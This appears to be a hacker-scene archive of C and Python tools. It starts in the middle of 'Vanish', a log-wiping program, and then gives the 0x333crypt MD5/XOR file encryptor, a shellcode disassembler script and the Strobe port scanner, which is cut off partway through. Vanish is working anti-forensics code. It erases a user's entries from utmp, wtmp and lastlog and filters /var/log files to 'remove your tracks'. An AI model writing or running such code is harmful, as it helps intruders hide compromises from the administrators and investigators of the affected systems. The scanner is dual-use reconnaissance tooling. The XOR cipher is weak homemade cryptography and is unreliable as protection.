if (argc!=4)
{
   printf (&quot;\n\n&quot;);
   fprintf(stderr, &quot;Vanish by Neo the Hacker\n&quot;);
   fprintf(stderr, &quot;Usage: %s &lt;user&gt; &lt;host&gt; &lt;IP&gt;\n\n&quot;,argv[0]) ;
   exit () ;
}

/***************************
* OK Let&#039;s start with UTMP *
***************************/
size = sizeof(ut) ;
strcpy (user, argv[1]) ;
fin = open (UTMP, O_RDWR) ;
if (fin &lt; 0)
{
fprintf(stderr, &quot;\nFucking shit!! Utmp permission denied.Getting outta here!!\n&quot;);  
close (fin) ;
exit();
}
else
{
while (read (fin, &amp;ut, size) == size) {
       if (!strncmp(ut.ut_user, user, strlen(user))) {
                   memset(&amp;ut, 0, size);
                   lseek(fin, -1*size, SEEK_CUR);
                   write (fin, &amp;ut, size);
               }
        }
        close (fin);
        printf(&quot;\nutmp target processed.&quot;);
}
/***************************
* OK Let&#039;s go on with WTMP *
***************************/
	strcpy (host, argv[2]) ;
  strcpy(host_ip, argv[3]) ;
	
	fin = open(WTMP, O_RDONLY) ;
	if (fin &lt; 0) {
	fprintf(stderr, &quot;\nFucking shit!! Wtmp permission denied.Getting outta here.\n&quot;) ; 		                              
   close (fin) ; 		exit () ;
	}
	fout = open(&quot;wtmp.hm&quot;, O_WRONLY|O_CREAT) ;
	if (fout &lt; 0) {
		fprintf(stderr, &quot;\nDamn! Problems targeting wtmp. Getting outta here.\n&quot;) ;	
		close (fout) ;
		exit () ;
	}
	else {
	while (read (fin, &amp;ut, size) == size) {
	if ( (!strcmp(ut.ut_user, user)) || (!strncmp(ut.ut_host, host, strlen(host))) ) {
 	/* let it go into oblivion */  ; 	
	} 			
        else write (fout, &amp;ut, size) ; 		}
		close (fin) ;
		close (fout) ;
		if ((system(&quot;/bin/mv wtmp.hm /var/log/wtmp&quot;) &lt; 0) &amp;&amp;
		    (system(&quot;/bin/mv wtmp.hm /var/log/wtmp&quot;) == 127)) {
			fprintf(stderr, &quot;\nAch. Couldn&#039;t replace %s .&quot;, WTMP) ;
		}
                system(&quot;/bin/chmod 644 /var/log/wtmp&quot;) ;
		printf(&quot;\nwtmp target processed.&quot;) ;
	}
/***************************
* OK Let&#039;s look at LASTLOG *
***************************/
	size = sizeof(ll) ;
	fin = open(LASTLOG, O_RDWR) ;
	if (fin &lt; 0) {
	fprintf(stderr, &quot;\nFucking shit!! Lastlog permission denied.Getting outta here.\n&quot;) ; 		
                close (fin) ;
		exit () ;
	}
	else {
		pass = getpwnam(user) ;
		lseek(fin, size*pass-&gt;pw_uid, SEEK_SET) ;
		read(fin, &amp;ll, size) ;
		ll.ll_time = 0 ;
		strncpy (ll.ll_line, &quot;      &quot;, 5) ;
		strcpy (ll.ll_host, &quot; &quot;) ;
		lseek(fin, size*pass-&gt;pw_uid, SEEK_SET) ;
		write(fin, &amp;ll, size) ;
		close (fin) ;
		printf(&quot;\nlastlog target processed.\n&quot;) ;
	}

/**************************
* OK moving to /var ....  *
**************************/
i=0;
while (i&lt;8) {
printf(&quot;Processing %s\t&quot;, varlogs[i]) ;
pfile = fopen (varlogs[i],&quot;r&quot;);
if (!pfile)
{
   printf(&quot;Couldn&#039;t open %s\n\n&quot;, varlogs[i]);
   i++;
   continue ;
}


pfile2 = fopen (newlogs[i],&quot;w&quot;);
if (!pfile2)
{
printf(&quot;Couldn&#039;t create backup file! 
You have to have write permission to the folder!! %s \n\n&quot;, newlogs[i]);   
  i++;   
  continue;
}
else {
      while (fgets(buffer, MAXBUFF, pfile) != NULL) {
      if ((!strstr(buffer, user)) &amp;&amp; (!strstr(buffer, host))&amp;&amp;(!strstr(buffer, host_ip)))  { 			
fputs(buffer,pfile2) ;  } }
}
fclose (pfile);
fclose (pfile2);
printf (&quot;                   DONE.\n&quot;);
i++;
}
printf (&quot;\n\n&quot;);
system (&quot;mv messages.hm /var/log/messages&quot;);
system (&quot;mv secure.hm /var/log/secure&quot;);
system (&quot;mv xferlog.hm /var/log/xferlog&quot;);
system (&quot;mv maillog.hm /var/log/maillog&quot;);
system (&quot;mv warn.hm /var/log/warn&quot;);
system (&quot;mv mail.hm /var/log/mail&quot;);
system (&quot;mv httpda.hm /var/log/httpd.access_log&quot;);
system (&quot;mv httpde.hm /var/log/httpd.error_log&quot;);
printf (&quot;\n\n&quot;);
printf (&quot;V_A_N_I_S_H_E_D_!\n&quot;);
printf (&quot;Your tracks have been removed\n&quot;);
printf (&quot;Exiting programm !!\n\n&quot;);
exit();
}


#------------------------------------------------------------------#

#------------------------------------------------------------------#
[0x333crypt.c]
/*
 *  0x333crypt &lt;= MD5 &amp; xor
 *
 *  process:
 *
 *  xor1 -&gt; | mainkey in MD5 | 32 chars plain text readed by file
 *  xor2 -&gt; | subkey1 in MD5 | 32 chars plain text readed by file
 *  xor3 -&gt; | subkey2 in MD5 | 32 chars plain text readed by file
 *
 *  etc etc..
 *
 *  based on subkey generation in base a mainkey specified by user.
 *  key isn&#039;t written in file.
 *
 *  coded by nsn
 *
 *  developed and tested on linux slackware
 *  gcc -lssl source.c -o out
 *
 * ~ www.0x333.org ~
 *
 */

#include &lt;stdio.h&gt;
#include &lt;openssl/md5.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;

/* constants, variables and prototipes */

#define VERSION &quot;0.5&quot;
#define PASSLEN 128

typedef enum {FALSE,TRUE} BOOLEAN;

static char *MDString(char *string); 
char xor(char, char); /* make xor between two chars and return result */
void help(char *); /* prints help for user. */
void gen(char *, char *, char *, BOOLEAN); 

char      *mainkey     = NULL; /* can be changed with option -k */
char      *infile      = NULL; /* can be changed with option -i */
char      *outfile     = NULL; /* can be changed with option -o */
BOOLEAN   operation    = TRUE; 

/* functions source codes */

char xor(char a, char b) { return a^b; }

static char 
*MDString (char *string) 
{
    static char ret[33]={&quot;\0&quot;}, hex[2];
    unsigned char digest[16];
    unsigned int len = strlen(string), i;
    MD5_CTX context;

        MD5_Init(&amp;context);
        MD5_Update(&amp;context, string, len);
        MD5_Final(digest, &amp;context);

        for (i = 0; i &lt; 16; ++i) {
           sprintf(hex,&quot;%02x&quot;, digest[i]);
           strcat(ret,hex);
        }

return ret;
}

void
usage (char *prg)
{

   fprintf (stderr, &quot;\n [~] 0x333crypt %s &lt;= files with a key [~]\n&quot;,VERSION);
   fprintf (stderr, &quot; [~]     coded by nsn of 0utSid3rs      [~]\n\n&quot;);
   fprintf (stderr, &quot; Usage: %s [ -k password ] [-e/d ] [ -i infile ] [-o outfile] [ -h ]\n\n&quot;, prg);       
   fprintf (stderr, &quot; \t-k   = key for encrypt/decrypt [ lentgh &lt;= %d ]\n&quot;,PASSLEN);
   fprintf (stderr, &quot; \t-e/d = operation encrypt/decrypt\n&quot;);
   fprintf (stderr, &quot; \t-i   = infile\n&quot;);
   fprintf (stderr, &quot; \t-o   = outfile\n&quot;);
   fprintf (stderr, &quot; \t-h   = show this help\n\n&quot;);

   exit(-333);
}

void 
gen(char *infile, char *outfile, char *mainkey, BOOLEAN operation)
{
    FILE *instream = NULL, *outstream = NULL;
    unsigned long int subkeyscounter = 1;
    static char *hashMD5, tempkey[1024]={&quot;\0&quot;}, data[33]={&quot;\0&quot;}, byte;
    unsigned short int i = 0;
    size_t len;

        if (!(instream = fopen(infile,&quot;rb&quot;)) || (!(outstream = fopen(outfile,&quot;wb&quot;))))
           printf(&quot;\n[*] error in opening %s or %s aborting!\n&quot;,infile,outfile);
        else {
   
           memset(data,0,sizeof(data));
           memset(tempkey,0,sizeof(tempkey));
           hashMD5 = (char *)alloca(sizeof(data)); 
           memset(hashMD5,0,sizeof(hashMD5));
                      
           printf(&quot;\n[*] reading data... wait pls\n\n&quot;);
       
           /* reading all chars of file */

           while ((len = fread(&amp;data[i++], 1, 32,instream)))
           {
          
              strcpy(tempkey,mainkey);
              sprintf(tempkey,&quot;%s%d&quot;,mainkey,subkeyscounter);
              hashMD5 = MDString(tempkey);
              ++subkeyscounter;    
              
               /* xor subkey and plain text i,j */
               
                for (i = 0; i &lt; len; ++i)
                {
                
              byte = data[i];
                 
              if ((data[i] != hashMD5[i]) &amp;&amp; (data[i] != 0))                       
              byte = ((operation) ? xor(hashMD5[i],data[i]) : xor(data[i],hashMD5[i]));
                      
              fwrite(&amp;byte,1,1,outstream);
                }   
              i = 0;
              memset(data,0,sizeof(data));
              memset(tempkey,0,sizeof(tempkey));
              memset(hashMD5,0,sizeof(hashMD5));
            }                 
         printf(&quot;\n[*] work completed.\n[*] file generated with %d subkeys.\n&quot;,subkeyscounter);
         fclose(instream);
         fclose(outstream);
       }      
}

int
main (int argc, char **argv)
{
int c;

       while (( c = getopt (argc,argv,&quot;edh:k:i:o:&quot;)) != EOF)
       {
          switch(c) 
          {
             case &#039;e&#039; : operation = TRUE;break;
             case &#039;d&#039; : operation = FALSE;break;
             case &#039;k&#039; : mainkey = optarg;break;
             case &#039;i&#039; : infile = optarg;break; 
             case &#039;o&#039; : outfile = optarg;break;
             case &#039;h&#039; : usage(argv[0]);break;
             default  : 
	     usage( argv[0] );
          }
       }

      if ( argc != 8 )  { usage ( argv[0] ); }
       
      if (strlen(mainkey) &lt;= PASSLEN)
         gen(infile,outfile,mainkey,operation); 
      else
         printf(&quot;Password have to be with length &lt;= %d\n&quot;,PASSLEN);   

 return 0;
}

#------------------------------------------------------------------#

#------------------------------------------------------------------#
[eggdis.py]
#! /usr/bin/env python
import sys
from libdisasm import disasm,disasmbuf
dbuf = disasmbuf.DisasmBuffer(sys.stdin.read( ))
d=disasm.LinearDisassembler( )
d.disassemble(dbuf)
for rva,opcode in dbuf.instructions( ):
operands = map(lambda x:&quot;%s %-13s&quot; % (x.access( ),&quot;[%s]&quot; % str(x)),
opcode.operands( ))
print &quot;%08x: %-20s %s&quot; % (rva,str(opcode), &quot;&quot;.join(operands))

#------------------------------------------------------------------#

#------------------------------------------------------------------#
[strobe.c]
/*
 * Strobe (c) 1995 Julian Assange (proff@suburbia.net),
 * All rights reserved.
 * Port Scanner
 * $ cc strobe.c -o strobe
 */

#define VERSION &quot;1.03&quot;

#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;ctype.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/socket.h&gt;
#ifdef _AIX
#  include &lt;sys/select.h&gt;
#endif
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;netdb.h&gt;
#include &lt;string.h&gt;
#include &lt;errno.h&gt;

#if defined(solaris) || defined(linux) || defined(__FreeBSD__) || defined(__NetBSD__) || defined(__GCC__)
#  define fvoid void
#else
#  define fvoid
extern int optind;
extern char *optarg;
#endif
#define bool char

#ifndef INADDR_NONE
#  define INADDR_NONE ((unsigned long)-1)
#endif

#define port_t (unsigned short)

/*
 * the below should be set via the Makefile, but if not...
 */

#ifndef ETC_SERVICES
#  define ETC_SERVICES &quot;/etc/services&quot;
#endif
#ifndef STROBE_SERVICES
#  define STROBE_SERVICES &quot;strobe.services&quot;
#endif
#ifndef LIB_STROBE_SERVICES
#  define LIB_STROBE_SERVICES &quot;/usr/local/lib/strobe.services&quot;
#endif

int a_timeout = 20;
char *a_output = NULL;
char *a_services = &quot;strobe.services&quot;;
char *a_input = NULL;
/* char *a_prescan = NULL; */
int a_start = 1;
int a_end = 65535;
int a_sock_max = 64;
int a_abort = 0;
int a_bindport = 0;
char *a_bindaddr= NULL;
struct in_addr bindaddr;
bool f_linear = 0;
bool f_verbose = 0;
bool f_verbose_stats = 0;
bool f_fast = 0;
bool f_stats = 0;
bool f_quiet = 0;
bool f_delete_dupes = 0;
bool f_minimise = 0;
bool f_dontgetpeername = 0;

int connects = 0;
int hosts_done = 0;
int attempts_done = 0;
int attempts_outstanding = 0;
struct timeval time_start;

fd_set set_sel;
fd_set set_sel_r;
fd_set set_sel_w;

int host_n;
int Argc;
char **Argv;

FILE *fh_input;

#define HO_ACTIVE 1
#define HO_ABORT 2
#define HO_COMPLETING 4

struct hosts_s
{
    char *name;
    struct in_addr in_addr;
    int port;
    int portlist_ent;
    struct timeval time_used;
    struct timeval time_start;
    int attempts;
    int attempts_done;
    int attempts_highest_done;
    int connects;
    time_t notice_abort;
    int status;
};
struct hosts_s ho_initial;
struct hosts_s *hosts;

#define HT_SOCKET 1
#define HT_CONNECTING 2

struct htuple_s
{
    char *name;
    struct in_addr in_addr;
    int port;
    int sfd;
    int status;
    struct timeval sock_start;
    int timeout;
    struct hosts_s *host;
};

struct htuple_s ht_initial;
struct htuple_s *attempt;

struct port_desc_s
{
    int port;
    char *name;
    char *portname;
    struct port_desc_s *next;
    struct port_desc_s *next_port;
};

struct port_desc_s **port_descs;

int *portlist = NULL;
int portlist_n = 0;

char *
Srealloc (ptr, len)
  char *ptr;
  int len;
{
    char *p;
    int retries = 10;
    while (!(p = ptr? realloc (ptr, len): malloc(len)))
    {
        if (!--retries)
        {
		perror(&quot;malloc&quot;);
		exit(1);
	}
	if (!f_quiet)
	   fprintf(stderr, &quot;Smalloc: couldn&#039;t allocate %d bytes...sleeping\n&quot;, len);
	sleep (2);
    }
    return p;
}

char *
Smalloc (len)
  int len;
{
   return Srealloc (NULL, len);
}

fvoid
sock_block (sfd)
  int sfd;
{
    int flags;
    flags = (~O_NONBLOCK) &amp; fcntl (sfd, F_GETFL);
    fcntl (sfd, F_SETFL, flags);
}

fvoid
sock_unblock (sfd)
  int sfd;
{
    int flags;
    flags = O_NONBLOCK | fcntl (sfd, F_GETFL);
    fcntl (sfd, F_SETFL, flags);
}

int
timeval_subtract (result, x, y) /* from gnu c-lib info.texi */
  struct timeval *result, *x, *y;
{
/* Perform the carry for the later subtraction by updating y. */
if (x-&gt;tv_usec &lt; y-&gt;tv_usec) {
 int nsec = (y-&gt;tv_usec - x-&gt;tv_usec) / 1000000 + 1;
 y-&gt;tv_usec -= 1000000 * nsec;
 y-&gt;tv_sec += nsec;
}
if (x-&gt;tv_usec - y-&gt;tv_usec &gt; 1000000) {
 int nsec = (y-&gt;tv_usec - x-&gt;tv_usec) / 1000000;
 y-&gt;tv_usec += 1000000 * nsec;
 y-&gt;tv_sec -= nsec;
}

/* Compute the time remaining to wait.
  `tv_usec&#039; is certainly positive. */
result-&gt;tv_sec = x-&gt;tv_sec - y-&gt;tv_sec;
result-&gt;tv_usec = x-&gt;tv_usec - y-&gt;tv_usec;

/* Return 1 if result is negative. */
return x-&gt;tv_sec &lt; y-&gt;tv_sec;
}

fvoid
attempt_clear (h)
  struct htuple_s *h;
{
    if (h-&gt;status &amp; HT_SOCKET)
    {
	struct timeval tv1, tv2;
	gettimeofday(&amp;tv1, NULL);
	timeval_subtract(&amp;tv2, &amp;tv1, &amp;(h-&gt;sock_start));
	h-&gt;host-&gt;time_used.tv_sec+=tv2.tv_sec;
	if ((h-&gt;host-&gt;time_used.tv_usec+=tv2.tv_usec) &gt;= 1000000)
	{
	    h-&gt;host-&gt;time_used.tv_usec -= 1000000;
	    h-&gt;host-&gt;time_used.tv_sec++;
	}
        attempts_done++;
	h-&gt;host-&gt;attempts_done++;
	if (h-&gt;port &gt; h-&gt;host-&gt;attempts_highest_done)
	    h-&gt;host-&gt;attempts_highest_done=h-&gt;port;
	sock_unblock (h-&gt;sfd);
/*	shutdown (h-&gt;sfd, 2); */
	close (h-&gt;sfd);
        if (FD_ISSET(h-&gt;sfd, &amp;set_sel))
	{
	     FD_CLR (h-&gt;sfd, &amp;set_sel);
	     attempts_outstanding--;
	}
    }
    *h = ht_initial;
}

fvoid
clear_all ()
{
    int n;
    for (n = 0; n &lt; a_sock_max; n++)
	attempt_clear (&amp;attempt[n]);
}

fvoid
attempt_init ()
{
    int n;
    for (n = 0; n &lt; a_sock_max; n++)
	attempt[n] = ht_initial;
}

fvoid
hosts_init ()
{
    int n;
    for (n = 0; n &lt; a_sock_max; n++)
	hosts[n] = ho_initial;
}

fvoid
fdsets_init ()
{
    FD_ZERO(&amp;set_sel_r); /* yes, we have to do this, despite the later */
    FD_ZERO(&amp;set_sel_w); /* assisgnments */
    FD_ZERO(&amp;set_sel);
}

int
sc_connect (h)
  struct htuple_s *h;
{
    struct sockaddr_in sa_in;
    int sopts1 = 1;
    struct linger slinger;
    if ((h-&gt;sfd = socket (PF_INET, SOCK_STREAM, 0)) == -1)
	return 0;
    memset(&amp;sa_in, 0, sizeof(sa_in));
    h-&gt;status |= HT_SOCKET;
    gettimeofday(&amp;(h-&gt;sock_start), NULL);
    sock_unblock (h-&gt;sfd);
    setsockopt (h-&gt;sfd, SOL_SOCKET, SO_REUSEADDR, (char *) &amp;sopts1, sizeof (sopts1));
    setsockopt (h-&gt;sfd, SOL_SOCKET, SO_OOBINLINE, (char *) &amp;sopts1, sizeof (sopts1));
    slinger.l_onoff = 0;	/* off */
    setsockopt (h-&gt;sfd, SOL_SOCKET, SO_LINGER, (char *) &amp;slinger, sizeof (slinger));
    sa_in.sin_family = AF_INET;
    if (a_bindport)
        sa_in.sin_port = a_bindport;
    if (a_bindaddr)
        sa_in.sin_addr = bindaddr;
    if (a_bindaddr || a_bindport)
        if (bind (h-&gt;sfd, (struct sockaddr *)&amp;sa_in, sizeof(sa_in)) == -1)
        {
		fprintf(stderr, &quot;couldn&#039;t bind %s : %d  &quot;, a_bindaddr? a_bindaddr: &quot;0.0.0.0&quot;, ntohs(a_bindport));
		perror(&quot;&quot;);
		if (errno == EACCES)
			exit(1);
		return 0;
	}
    sa_in.sin_addr = h-&gt;in_addr;
    sa_in.sin_port = htons (h-&gt;port);

    if (connect (h-&gt;sfd, (struct sockaddr *) &amp;sa_in, sizeof (sa_in)) == -1)
    {
	switch (errno)
	{
	case EINPROGRESS:
	case EWOULDBLOCK:
	    break;
	case ETIMEDOUT:
	case ECONNREFUSED:
	case EADDRNOTAVAIL:
	    if (f_verbose)
	    {
		fprintf(stderr, &quot;%s:%d &quot;, h-&gt;name, h-&gt;port);
		perror(&quot;&quot;);
	    }
	    h-&gt;host-&gt;attempts++;
	    attempt_clear (h);
	    return 1;
	default:
	    if (!f_quiet)
	    {
	    	fprintf(stderr, &quot;%s:%d &quot;, h-&gt;name, h-&gt;port);
	    	perror (&quot;&quot;);
	    }
	    attempt_clear (h);
	    return 0;
	}
    }
    h-&gt;host-&gt;attempts++;
    h-&gt;status |= HT_CONNECTING;
    sock_block (h-&gt;sfd);
    FD_SET(h-&gt;sfd, &amp;set_sel);
    attempts_outstanding++;
    return 1;
}

int
gatherer_tcp (h)
  struct htuple_s *h;
{
    struct port_desc_s *pd;
    if (f_minimise)
	printf (&quot;%s\t%d\n&quot;, h-&gt;name, h-&gt;port);
    else
    {
    	if ((pd = port_descs[h-&gt;port]))
        {
    	    	printf (&quot;%-30s %-16s %5d/tcp %s\n&quot;, h-&gt;name, pd-&gt;portname, h-&gt;port, pd-&gt;name);
	    while (!f_delete_dupes &amp;&amp; !f_minimise &amp;&amp; (pd=pd-&gt;next))
	        printf (&quot;#%-29s %-16s %5d/tcp %s\n&quot;, h-&gt;name, pd-&gt;portname, h-&gt;port, pd-&gt;name);
    	}
    	else
	    printf (&quot;%-30s %-16s %5d/tcp unassigned\n&quot;, h-&gt;name, &quot;unknown&quot;, h-&gt;port);
    }
    h-&gt;host-&gt;connects++;
    connects++;
    attempt_clear (h);
    return 1;
}

bool
gather ()
{
    struct timeval timeout;
    struct htuple_s *h;
    int n;
    int selected;
    time_t tim;

    if (!attempts_outstanding) return 1;
    set_sel_r=set_sel_w=set_sel;
    timeout.tv_sec = 0;
    timeout.tv_usec = 250000; /* 1/4 of a second */

    selected = select (FD_SETSIZE, &amp;set_sel_r, &amp;set_sel_w, 0, &amp;timeout);
    /* Look for timeouts */

    tim = time (NULL);
    for ( n = 0 ; n &lt; a_sock_max; n++ )
    {
      h = &amp;attempt[n];
      if ((h-&gt;status &amp; HT_SOCKET) &amp;&amp;
	  ((h-&gt;sock_start.tv_sec + h-&gt;timeout) &lt; tim))
 	attempt_clear (h);
    }

    switch (selected)
    {
    case -1:
	perror (&quot;select&quot;);
	return 0;
    case 0:
	return 1;
    }
    for (n = 0; selected &amp;&amp; (n &lt; a_sock_max); n++)
    {
	h = &amp;attempt[n];
	if (h-&gt;status &amp; HT_CONNECTING)
	{
	    if (FD_ISSET (h-&gt;sfd, &amp;set_sel_r) || FD_ISSET (h-&gt;sfd, &amp;set_sel_w))
	    {
		struct sockaddr_in in;
		int len = sizeof (in);
		selected--;
		/* select() lies occasionaly
                 */
		if (!f_dontgetpeername) /* but solaris2.3 crashes occasionally ;-| */
		{
			if (getpeername (h-&gt;sfd, (struct sockaddr *) &amp;in, &amp;len) == 0)
		    	    gatherer_tcp (h);
			else
		    	    attempt_clear (h);
		}
		else
		    	gatherer_tcp (h);
	    }
	}
    }
    return 1;
}

bool
add_attempt (add)
  struct htuple_s *add;
{
    struct htuple_s *h;
    static time_t oldtime;
    static int n;
    for (;;)
    {
	for (; n &lt; a_sock_max; n++)
	{
	    h = &amp;attempt[n];
	    if (!h-&gt;status)
		goto foundfree;
	}
	n = 0;
	gather ();
	continue;
      foundfree:
	*h = *add;
	if (!sc_connect (h))
	{
	    gather ();
	    continue;
	}
	if ((oldtime + 1) &lt; time (NULL))
	{
	    oldtime = time (NULL);
	    gather ();
	}
	break;
    }
    return 1;
}

int
scatter (host, timeout)
  struct hosts_s *host;
  int timeout;
{
    static struct htuple_s add;
    add = ht_initial;
    add.host = host;
    add.name = host-&gt;name;
    add.in_addr = host-&gt;in_addr;
    add.port = host-&gt;port;
    add.timeout = timeout;
    if (f_verbose)
	fprintf (stderr, &quot;attempting port=%d host=%s\n&quot;, add.port, add.name);
    add_attempt (&amp;add);
    return 1;
}

fvoid
wait_end (t)
  int t;
{
    time_t st;
    st = time (NULL);
    while ((st + t) &gt; time (NULL))
    {
	gather ();
	if (attempts_outstanding&lt;1) break;
    }
}

struct in_addr
resolve (name)
  char *name;
{
    static struct in_addr in;
    unsigned long l;
    struct hostent *ent;
    if ((l = inet_addr (name)) != INADDR_NONE)
    {
	in.s_addr = l;
	return in;
    }
    if (!(ent = gethostbyname (name)))
    {
	perror (name);
	in.s_addr = INADDR_NONE;
	return in;
    }
    return *(struct in_addr *) ent-&gt;h_addr;
}

char *
next_host ()
{
    static char lbuf[512];
    hosts_done++;
    if (a_input)
    {
	int n;
reread:
	if (!fgets (lbuf, sizeof (lbuf), fh_input))
	{
	    fclose (fh_input);
            a_input = NULL;
	    return next_host();
	}
	if (strchr(&quot;# \t\n\r&quot;, lbuf[0])) goto reread;
	n = strcspn (lbuf, &quot; \t\n\r&quot;);
	if (n)
	    lbuf[n] = &#039;\0&#039;;
	return lbuf;
    }
    if ( host_n &gt;= Argc )
      return NULL;

    return Argv[host_n++];
}

bool
host_init (h, name, nocheck)
  struct hosts_s *h;
  char *name;
  bool nocheck;
{
    int n;
    *h=ho_initial;
    h-&gt;in_addr = resolve (name);
    if (h-&gt;in_addr.s_addr == INADDR_NONE)
	return 0;
    if (!nocheck)
        for (n=0; n&lt;a_sock_max; n++)
   	{ 
	    if (hosts[n].name &amp;&amp; hosts[n].in_addr.s_addr==h-&gt;in_addr.s_addr)
	    {
		if (!f_quiet)
		    fprintf(stderr, &quot;ip duplication: %s == %s (last host ignored)\n&quot;,
		        hosts[n].name, name);
		return 0;
	    }
        }
    h-&gt;name = (char *) Smalloc (strlen (name) + 1);
    strcpy (h-&gt;name, name);
    h-&gt;port = a_start;
    h-&gt;status = HO_ACTIVE;
    gettimeofday(&amp;(h-&gt;time_start), NULL);
    return 1;
}

fvoid
host_clear (h)
  struct hosts_s *h;
{
    if (h-&gt;name)
    {
    	free (h-&gt;name);
    }
    *h=ho_initial;
}

fvoid
host_stats (h)
  struct hosts_s *h;
{
    struct timeval tv, tv2;
    float t, st;
    gettimeofday(&amp;tv, NULL);
    timeval_subtract(&amp;tv2, &amp;tv, &amp;(h-&gt;time_start));
    t = tv2.tv_sec+(float)tv2.tv_usec/1000000.0;
    st = h-&gt;time_used.tv_sec+(float)h-&gt;time_used.tv_usec/1000000.0;
    fprintf(stderr, &quot;stats: host = %s trys = %d cons = %d time = %.2fs trys/s = %.2f trys/ss = %.2f\n&quot;,
	h-&gt;name, h-&gt;attempts_done, h-&gt;connects, t, h-&gt;attempts_done/t, h-&gt;attempts_done/st);
}

fvoid
final_stats()
{
    struct timeval tv, tv2;
    float t;
    gettimeofday(&amp;tv, NULL);
    timeval_subtract(&amp;tv2, &amp;tv, &amp;(time_start));
    t = tv2.tv_sec+(float)tv2.tv_usec/1000000.0;
    fprintf(stderr, &quot;stats: hosts = %d trys = %d cons = %d time = %.2fs trys/s = %.2f\n&quot;,
	hosts_done, attempts_done, connects, t, attempts_done/t);
}

bool skip_host(h)
  struct hosts_s *h;
{
    if (a_abort &amp;&amp; !h-&gt;connects &amp;&amp; (h-&gt;attempts_highest_done &gt;= a_abort)) /* async pain */
    {
	if (h-&gt;status &amp; HO_ABORT)
	{
	    if ((time(NULL)-h-&gt;notice_abort)&gt;a_timeout)
	    {
		if (f_verbose)
		    fprintf(stderr, &quot;skipping: %s (no connects in %d attempts)\n&quot;,
			h-&gt;name, h-&gt;attempts_done);
		return 1;
	    }
	} else 
        {
		h-&gt;notice_abort=time(NULL);
		h-&gt;status|=HO_ABORT;
	}
    }
    return 0;
}

int
next_port (h)
struct hosts_s *h;
{
    int n;
    for (n = h-&gt;port; ++n &lt;= a_end;)
    {
    	if (!f_fast) return n;
	if (++h-&gt;portlist_ent&gt;portlist_n) return -1;
        return (portlist[h-&gt;portlist_ent-1]);
    }
    return -1;
}

fvoid
scan_ports_linear ()
{
    struct hosts_s host;
    char *name;
    while ((name = next_host ()))
    {
	if (!host_init(&amp;host, name, 1)) continue;
	for (;;)
	{
	    scatter (&amp;host, a_timeout);
	    if (skip_host(&amp;host)) break;
	    if ((host.port = next_port(&amp;host))==-1)
		break;
	}
	wait_end (a_timeout);
	if (f_verbose_stats)
	    host_stats (&amp;host);
	clear_all ();
	host_clear(&amp;host);
    }
}

/* Huristics:
 *  o  fast connections have priority == maximise bandwidth i.e 
 *     a port in the hand is worth two in the bush
 *
 *  o  newer hosts have priority == lower ports checked more quickly
 *
 *  o  all hosts eventually get equal &quot;socket time&quot; == despite
 *     priorities let no one host hog the sockets permanently
 *
 *  o  when host usage times are equal (typically on or shortly after
 *     initial startup) distribute hosts&lt;-&gt;sockets evenly rather than
 *     play a game of chaotic bifurcatic ping-pong
 */
          
fvoid
scan_ports_paralell ()
{
    int n;
    struct timeval smallest_val;
    int smallest_cnt;
    char *name;
    struct hosts_s *h, *smallest = &amp;hosts[0];
    while (smallest)
    {
	smallest_val.tv_sec=0xfffffff;
	smallest_val.tv_usec=0;
	for (n = 0, smallest_cnt = 0xfffffff, smallest = NULL; n &lt; a_sock_max; n++)
	{
	    h = &amp;hosts[n];

	    if (((h-&gt;status &amp; HO_COMPLETING) &amp;&amp;
                 (h-&gt;attempts_done == h-&gt;attempts)) ||
                skip_host(h))
	    {
		if (f_verbose_stats) host_stats (h);
		host_clear (h);
	    }

	    if (!h-&gt;name &amp;&amp; ((name = next_host ())))
		if (!host_init (h, name, 0))
		{
		    host_clear (h);
		    continue;
		}

	    if (h-&gt;name)
	    {
		if (((h-&gt;time_used.tv_sec &lt; smallest_val.tv_sec) ||
		     ((h-&gt;time_used.tv_sec == smallest_val.tv_sec) &amp;&amp;
		      (h-&gt;time_used.tv_usec &lt;= smallest_val.tv_usec))) &amp;&amp;
		    (((h-&gt;time_used.tv_sec != smallest_val.tv_sec) &amp;&amp;
		      (h-&gt;time_used.tv_usec != smallest_val.tv_usec)) ||
		     (h-&gt;attempts &lt; smallest_cnt)))
	        {
	  	    smallest_cnt = h-&gt;attempts;
		    smallest_val = h-&gt;time_used;
		    smallest = h;
		 }
	    }
	}

	if (smallest)
	{
	    if (!(smallest-&gt;status &amp; HO_COMPLETING))
	    {
		scatter (smallest, a_timeout);
		if ((smallest-&gt;port=next_port(smallest))==-1)
	            smallest-&gt;status|=HO_COMPLETING;
	    }
	    else
		gather();
	}
    }
}

fvoid
loaddescs ()
{
    FILE *fh;
    char lbuf[1024];
    char desc[256];
    char portname[17];
    unsigned int port;
    char *fn;
    char prot[4];
    prot[3]=&#039;\0&#039;;
    if (!(fh = fopen ((fn=a_services), &quot;r&quot;)) &amp;&amp;
        !(fh = fopen ((fn=LIB_STROBE_SERVICES), &quot;r&quot;)) &amp;&amp;
        !(fh = fopen ((fn=ETC_SERVICES), &quot;r&quot;)))
    {
	perror (fn);
	exit (1);
    }
    port_descs=(struct port_desc_s **) Smalloc(sizeof(struct port_descs_s *) * 65536);
    memset(port_descs, 0, 65536);
    while (fgets (lbuf, sizeof (lbuf), fh))
    {
	char *p;
	struct port_desc_s *pd, *pdp;
	if (strchr(&quot;*# \t\n&quot;, lbuf[0])) continue;
	if (!(p = strchr (lbuf, &#039;/&#039;))) continue;
	*p = &#039; &#039;;
	desc[0]=&#039;\0&#039;;
	if (sscanf (lbuf, &quot;%16s %u %3s %255[^\r\n]&quot;, portname, &amp;port, prot, desc) &lt;3 || strcmp (prot, &quot;tcp&quot;) || (port &gt; 65535))
	    continue;
	pd = port_descs[port];
	if (!pd)
	{
	    portlist = (int *)Srealloc((char *)portlist, ++portlist_n*sizeof(int));
	    portlist[portlist_n-1]=port;
	}
	if (!f_minimise)
	{
	    pdp = (struct port_desc_s *) Smalloc (sizeof (*pd) + strlen (desc) + 1 + strlen (portname) + 1);
	    if (pd)
	    {
	        for (; pd-&gt;next; pd = pd-&gt;next);
	        pd-&gt;next = pdp;
	        pd = pd-&gt;next;
	    } else 
	    {
	        pd = pdp;
	        port_descs[port] = pd;
